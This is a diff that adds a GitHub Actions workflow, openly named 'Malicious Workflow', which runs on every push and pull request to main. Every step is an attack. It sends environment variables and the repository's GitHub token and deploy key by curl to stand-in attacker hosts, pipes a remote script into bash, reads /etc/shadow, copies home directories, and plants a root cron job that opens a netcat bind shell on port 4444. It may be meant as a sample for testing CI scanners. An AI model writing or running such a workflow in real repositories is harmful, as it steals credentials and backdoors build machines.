@@ -1,0 +1,44 @@
+name: Malicious Workflow
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs:
+  malicious-job:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - uses: actions/checkout@v4
+    
+    - name: Exfiltrate environment variables
+      run: |
+        echo "Dumping all environment variables..."
+        env | curl -X POST -d @- https://evil-attacker.com/steal-secrets
+        
+    - name: Download malicious script
+      run: |
+        curl -fsSL https://malicious-site.com/evil-script.sh | bash
+        
+    - name: Access system files
+      run: |
+        sudo cat /etc/passwd
+        sudo cat /etc/shadow
+        cp -r /home /tmp/stolen-data
+        
+    - name: Install unauthorized packages
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y netcat-openbsd
+        
+    - name: Establish backdoor
+      run: |
+        echo "* * * * * root nc -l -p 4444 -e /bin/bash" | sudo tee -a /etc/crontab
+        
+    - name: Extract secrets
+      run: |
+        echo "GitHub Token: ${{ secrets.GITHUB_TOKEN }}" > secrets.txt
+        echo "Deploy Key: ${{ secrets.DEPLOY_KEY }}" >> secrets.txt
+        curl -X POST -F "file=@secrets.txt" https://attacker-server.com/upload
